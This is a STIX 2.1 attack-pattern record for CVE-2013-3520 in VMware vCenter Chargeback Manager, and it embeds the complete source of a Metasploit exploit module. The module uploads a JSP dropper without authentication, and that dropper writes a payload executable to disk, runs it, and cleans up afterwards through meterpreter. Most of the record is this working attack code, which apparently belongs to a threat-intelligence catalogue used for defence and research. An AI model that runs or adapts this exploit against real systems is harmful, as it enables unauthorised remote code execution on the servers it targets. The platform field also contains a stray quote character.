{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a7f38c4-7079-4f88-8e20-8686b93e751c",
    "created": "2024-08-14T16:53:26.623653Z",
    "modified": "2024-08-14T16:53:26.623657Z",
    "name": "VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in VMware vCenter Chargeback Manager where the ImageUploadServlet servlet allows unauthenticated file upload. The files are uploaded to the /cbmui/images/ web path, where JSP code execution is allowed. The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1 on Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/vmware_vcenter_chargeback_upload.rb",
            "external_id": "vmware_vcenter_chargeback_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3520"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache.*Win32/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a code execution flaw in VMware vCenter Chargeback Manager,\n        where the ImageUploadServlet servlet allows unauthenticated file upload. The files\n        are uploaded to the /cbmui/images/ web path, where JSP code execution is allowed.\n        The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1\n        on Windows 2003 SP2.\n      },\n      'Author'       =>\n        [\n          'Andrea Micalizzi', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-3520' ],\n          [ 'OSVDB', '94188' ],\n          [ 'BID', '60484' ],\n          [ 'ZDI', '13-147' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'Arch' => ARCH_X86,\n      'Targets'     =>\n        [\n          [ 'VMware vCenter Chargeback Manager 2.0.1 / Windows 2003 SP2', { } ]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-05-15'))\n\n    register_options(\n      [\n        Opt::RPORT(443)\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  #\n  # Try to find and delete the jsp if we get a meterpreter.\n  #\n  def on_new_session(cli)\n\n    if not @dropper or @dropper.empty?\n      return\n    end\n\n    if cli.type != 'meterpreter'\n      print_error(\"Meterpreter not used. Please manually remove #{@dropper}\")\n      return\n    end\n\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_status(\"Searching: #{@dropper}\")\n      files = cli.fs.file.search(\"\\\\\", @dropper)\n      if not files or files.empty?\n        print_error(\"Unable to find #{@dropper}. Please manually remove it.\")\n        return\n      end\n\n      files.each { |f|\n        print_warning(\"Deleting: #{f['path'] + \"\\\\\" + f['name']}\")\n        cli.fs.file.rm(f['path'] + \"\\\\\" + f['name'])\n      }\n      print_good(\"#{@dropper} deleted\")\n      return\n    rescue ::Exception => e\n      print_error(\"Unable to delete #{@dropper}: #{e.message}\")\n    end\n  end\n\n  def upload_file(filename, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(contents, \"image/png\", nil, \"form-data; name=\\\"#{rand_text_alpha(4+rand(4))}\\\"; filename=\\\"#{filename}\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi(\n    {\n      'uri'     => normalize_uri(\"cbmui\",  \"ImageUploadServlet\"),\n      'method'  => 'POST',\n      'data'    => data,\n      'ctype'   => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie'  => \"JSESSIONID=#{@session}\"\n    })\n\n    if res and res.code == 200\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(\"cbmui\", \"en_US\", \"themes\", \"excel\", \"index.htm\"),\n    })\n\n    if res and res.code == 200 and res.body =~ /vCenter Chargeback Manager/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Uploading JSP to execute the payload\")\n\n    exe = payload.encoded_exe\n    exe_filename = rand_text_alpha(8) + \".exe\"\n\n    # The JSP dropper is needed because there isn't directory traversal, just\n    # arbitrary file upload to a web path where JSP code execution is allowed.\n    dropper = jsp_drop_and_execute(exe, exe_filename)\n    dropper_filename = rand_text_alpha(8) + \".jsp\"\n\n    if upload_file(dropper_filename, dropper)\n      register_files_for_cleanup(exe_filename)\n      @dropper = dropper_filename\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP upload failed\")\n    end\n\n    print_status(\"Executing payload\")\n    send_request_cgi(\n    {\n      'uri'    => normalize_uri(\"cbmui\", \"images\", dropper_filename),\n      'method' => 'GET'\n    })\n  end\n\n  # This should probably go in a mixin\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|try {\\n|\n    jspraw << %Q|  Runtime.getRuntime().exec(\"chmod +x #{command}\");\\n|\n    jspraw << %Q|} catch (IOException ioe) { }\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_drop_and_execute(bin_data, output_file)\n    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}